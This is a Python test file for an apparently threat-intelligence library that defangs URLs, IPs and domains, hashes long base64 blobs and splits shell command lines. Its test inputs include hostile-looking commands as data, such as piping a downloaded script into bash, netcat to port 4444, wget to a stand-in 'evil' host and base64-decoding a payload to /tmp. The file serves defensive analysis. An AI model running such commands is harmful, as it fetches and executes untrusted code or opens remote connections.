import hashlib

from interlinear_cti.normalize import defang, normalize_text, replace_blobs, truncate


def test_defangs_urls_and_ip_hosts():
    assert defang("curl http://203.0.113.5/x.sh | bash") == "curl hxxp://203.0.113[.]5/x.sh | bash"


def test_defangs_domain_hosts_at_the_last_dot():
    assert defang("wget https://evil.example.ru/a") == "wget hxxps://evil.example[.]ru/a"


def test_defangs_bare_domains_with_known_tlds():
    assert defang("nslookup c2.badhost.top") == "nslookup c2.badhost[.]top"


def test_defangs_bare_ipv4_with_and_without_port():
    assert defang("nc 203.0.113.5 4444; nc 198.51.100.7:8080") == "nc 203.0.113[.]5 4444; nc 198.51.100[.]7:8080"


def test_defangs_ipv6_addresses():
    assert defang("ping6 2001:db8::1") == "ping6 2001[:]db8[:][:]1"


def test_leaves_file_names_versions_and_times_alone():
    for text in ("bash install.sh; cat notes.txt", "python3.10 -V", "tool --version 1.2.3.4.5", "at 12:34:56"):
        assert defang(text) == text


def test_defang_is_idempotent():
    for text in ("curl http://203.0.113.5/x.sh | bash", "wget https://evil.example.ru/a",
                 "nslookup c2.badhost.top", "ping6 2001:db8::1"):
        once = defang(text)
        assert defang(once) == once


def test_replaces_long_blobs_with_their_hash():
    blob = "A" * 250
    digest = hashlib.sha256(blob.encode()).hexdigest()
    assert replace_blobs(f"echo {blob} | base64 -d") == f"echo <blob sha256={digest} len=250> | base64 -d"


def test_keeps_short_base64():
    assert replace_blobs("echo aGVsbG8= | base64 -d") == "echo aGVsbG8= | base64 -d"


def test_truncates_long_lines_and_records_the_hash():
    text = "x" * 5000
    digest = hashlib.sha256(text.encode()).hexdigest()
    out = truncate(text)
    assert out.startswith("x" * 4096)
    assert out.endswith(f"<truncated len=5000 sha256={digest}>")


def test_normalize_text_replaces_blobs_then_defangs():
    blob = "QUFB" * 60
    out = normalize_text(f"echo {blob} | base64 -d > /tmp/p; curl http://203.0.113.5/")
    assert out.startswith("echo <blob sha256=")
    assert out.endswith("curl hxxp://203.0.113[.]5/")


from interlinear_cti.normalize import join_logical_lines, split_commands


def test_split_on_semicolons_and_logical_operators():
    assert split_commands("cd /tmp; wget hxxp://a[.]b/x && chmod +x x || echo fail") == [
        "cd /tmp", "wget hxxp://a[.]b/x", "chmod +x x", "echo fail"]


def test_split_respects_quotes():
    assert split_commands("echo 'a;b' ; echo \"c && d\"") == ["echo 'a;b'", 'echo "c && d"']


def test_split_respects_subshells_and_command_substitution():
    assert split_commands("(cd /tmp && ls); id") == ["(cd /tmp && ls)", "id"]
    assert split_commands("echo $(id; whoami) ; ls") == ["echo $(id; whoami)", "ls"]


def test_split_keeps_pipes_and_escaped_semicolons():
    assert split_commands("curl -s x | bash") == ["curl -s x | bash"]
    assert split_commands("find . -exec rm {} \\; ; ls") == ["find . -exec rm {} \\;", "ls"]


def test_split_leaves_multi_line_commands_whole():
    assert split_commands("cat <<EOF\nx; y\nEOF") == ["cat <<EOF\nx; y\nEOF"]


def test_join_continuations_heredocs_and_blank_lines():
    lines = ["echo a \\", "  b", "cat <<EOF > /tmp/x", "line1", "EOF", "", "id"]
    assert join_logical_lines(lines) == [(1, "echo a b"), (3, "cat <<EOF > /tmp/x\nline1\nEOF"), (7, "id")]


def test_join_quoted_heredoc_delimiter():
    assert join_logical_lines(["cat <<'END'", "x", "END", "id"]) == [(1, "cat <<'END'\nx\nEND"), (4, "id")]


def test_join_powershell_backtick_continuation():
    assert join_logical_lines(["Get-Process `", "  | Select Name"], continuation="`") == [(1, "Get-Process | Select Name")]
